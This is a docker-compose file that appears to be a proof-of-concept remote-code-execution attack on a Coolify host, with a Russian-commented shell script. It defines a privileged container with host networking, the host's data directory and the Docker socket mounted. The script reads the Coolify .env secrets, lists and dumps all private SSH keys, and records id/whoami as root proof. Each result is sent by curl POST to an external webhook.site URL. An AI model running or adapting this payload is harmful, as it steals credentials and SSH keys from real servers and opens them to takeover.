version: '3.8'
services:
  rce-test:
    image: 'alpine:3.19'
    privileged: true
    network_mode: host
    volumes:
      - '/data:/host-data'
      - '/var/run/docker.sock:/var/run/docker.sock'
    command:
      - sh
      - -c
      - |
        apk add --no-cache curl
        
        # 1. Читаем главный .env
        cat /host-data/coolify/source/.env > /tmp/env.txt 2>&1
        curl -X POST --data-binary @/tmp/env.txt https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=main_env
        
        # 2. Список SSH ключей
        ls -la /host-data/coolify/ssh/keys/ > /tmp/ssh_list.txt 2>&1
        curl -X POST --data-binary @/tmp/ssh_list.txt https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=ssh_keys_list
        
        # 3. Читаем все приватные ключи
        cat /host-data/coolify/ssh/keys/ssh_key@* > /tmp/ssh_keys.txt 2>&1
        curl -X POST --data-binary @/tmp/ssh_keys.txt https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=ssh_private_keys
        
        # 4. Доказательство root (id и whoami)
        id > /tmp/id.txt 2>&1
        whoami >> /tmp/id.txt 2>&1
        curl -X POST --data-binary @/tmp/id.txt https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=root_proof
        
        sleep 3600
